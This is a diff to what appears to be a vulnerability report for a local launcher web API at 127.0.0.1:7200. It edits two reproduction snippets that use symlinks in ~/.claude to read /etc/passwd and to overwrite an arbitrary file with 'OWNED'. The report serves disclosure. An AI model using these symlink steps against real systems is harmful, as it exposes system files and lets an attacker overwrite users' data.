@@ -72,17 +72,17 @@ OS read/write follows the link to arbitrary user-accessible files.
 
 **Repro (GET → read /etc/passwd)**:
 ```bash
-ln -sf /etc/passwd /Users/dayuer/.claude/evil.md
-curl 'http://127.0.0.1:7200/api/launcher/file?path=/Users/dayuer/.claude/evil.md'
+ln -sf /etc/passwd ~/.claude/evil.md
+curl 'http://127.0.0.1:7200/api/launcher/file?path=~/.claude/evil.md'
 # → 9344 bytes of /etc/passwd, status 200
 ```
 
 **Repro (POST → overwrite arbitrary user file)**:
 ```bash
 echo "SAFE" > /tmp/target.txt
-ln -sf /tmp/target.txt /Users/dayuer/.claude/write-evil.md
+ln -sf /tmp/target.txt ~/.claude/write-evil.md
 curl -X POST '.../api/launcher/file' \
-  -d '{"path":"/Users/dayuer/.claude/write-evil.md","content":"OWNED"}'
+  -d '{"path":"~/.claude/write-evil.md","content":"OWNED"}'
 # → /tmp/target.txt content = "OWNED", symlink left intact, bogus .bak
 #   written next to the symlink (not the real target)
 ```
